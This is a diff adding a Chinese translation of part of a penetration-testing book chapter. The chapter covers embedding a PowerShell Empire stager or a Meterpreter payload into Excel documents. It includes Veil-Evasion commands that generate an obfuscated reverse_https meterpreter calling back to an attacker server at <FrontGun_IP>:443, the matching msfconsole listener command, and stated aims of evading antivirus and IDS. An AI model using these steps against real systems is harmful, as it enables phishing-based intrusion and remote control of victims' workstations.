@@ -269,6 +269,57 @@ IEX ($B-joIn'')
 ![](./Chap2/10.Stager.png)
 
 
+我们将在接下来的章节中探讨Empire的一些有趣功能，但与此同时，您可以查看帮助命令以获得一个想法。
+
+为了将此PowerShell脚本嵌入到Excel文档中，我们将使用普通的shell函数，如前所示，或依赖于LuckyStrike。
+
+
+#### 4)Meterpreter  in VBA
+为了替代使用PowerShell Empire的stager来获取shell，我们可以采取另一种方式，例如，通过部署一个来自Metasploit框架的meterpreter shell。就我们的直接目的而言，两个平台之间的差异相对较小。他们都有额外的模块来对受感染的工作站执行有趣的操作，但是使用两个分级器会增加绕过SPH的反恶意软件解决方案（防病毒，沙箱，IDS等）的几率。
+
+如前所述，虽然metasploit的有效载荷（包括meterpreter）是反病毒公司所熟知的。他们一旦被目标接收就永远不会发出警报。为了克服这个障碍，我们将使用另一个自动添加多层加密和混淆的工具生成相同的meterpreter有效负载：Veil-Evasion（项目地址:https://github.com/Veil-Framework/Veil-Evasion ，Veil-Evasion是与Metasploit生成相兼容的Payload的一款辅助框架,并可以绕过大多数的杀软）。
+
+回顾一下，Veil-Evasion将在PowerShell中生成一个模糊的meterpreter shellcode，这段代码将连接回连Front Gun服务器上的常规metasploit监听器，并让我们完全访问工作站。
+
+
+非常漂亮。但是我们该怎么做呢？首先，我们需要在Linux上使用经典的apt-get install安装Veil-Evasion。安装时间有点长，但我们可以一次完成，非常简单直观：
+![](./Chap2/11.Veil-Evasion.png)
+
+
+list命令显示所有可用的有效负载。我们选择PowerShell  reverse_https有效负载：
+```
+>use powershell/meterpreter/rev_https
+>set Proxy Y
+>set LHost <FrontGun_IP>
+>set LPort 443
+>generate
+```
+
+这会生成两个文件:
+- 执行PowerShell 有效载荷的meter.bat文件
+- 一个预先配置的metasploit监听器：meter.rc
+
+我们需要使用以下命令启动监听器:
+```
+FrontGun$ msfconsole -r meter.rc
+```
+
+然后我们可以测试meter.bat文件以确保它正常运行：
+![](./Chap2/12.Test-meter-bat.png)
+
+好的，现在要将此有效负载包含在Excel文件中，我们需要人工地深入了解代码。如果打开生成的meter.bat文件，您将看到其唯一目的是找出目标的体系结构并启动相应的PowerShell版本（x86或x64）：
+![](./Chap2/13.Code-meter-bat.png)
+
+
+
+
+
+
+
+
+
+
+
 > 翻译：2hu2huxia  2019/8/16
 
 
